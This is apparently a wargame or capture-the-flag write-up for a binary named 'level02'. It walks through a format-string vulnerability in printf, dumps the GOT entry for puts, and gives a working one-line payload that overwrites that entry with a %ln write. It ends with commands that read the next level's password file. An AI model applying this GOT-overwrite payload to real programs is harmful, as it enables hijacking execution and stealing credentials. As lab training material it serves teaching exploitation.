In <main> function the <printf> call at 0x0000000000400aa2 is not secure and directly prints what's in [rbp-0x70].
We can see that this call is followed by a call to <puts>.

$ (gdb) disas main
...
0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]
0x0000000000400a9a <+646>:	mov    rdi,rax
0x0000000000400a9d <+649>:	mov    eax,0x0
0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>
0x0000000000400aa7 <+659>:	mov    edi,0x400d3a
0x0000000000400aac <+664>:	call   0x400680 <puts@plt>
0x0000000000400ab1 <+669>:	mov    edi,0x1
0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>

Via this <printf>, we see that we control the 8th argument on the stack.

The idea is to replace the call to <puts> by the call to <printf> located at 0x0000000000400a6c.

We dump the GOT to get the address of <puts>

$ objdump -R ./level02
...
00000000006011e0 R_X86_64_JUMP_SLOT  puts
...

0x0000000000400a6c = 4196972

$ cat <(python -c "print('%4196972d%8\$ln')") <(python -c "print('\x00\x00\x00\x00\x00\x60\x11\xe0'[::-1])") - | ./level02
cd /home/user/level03
cat .pass
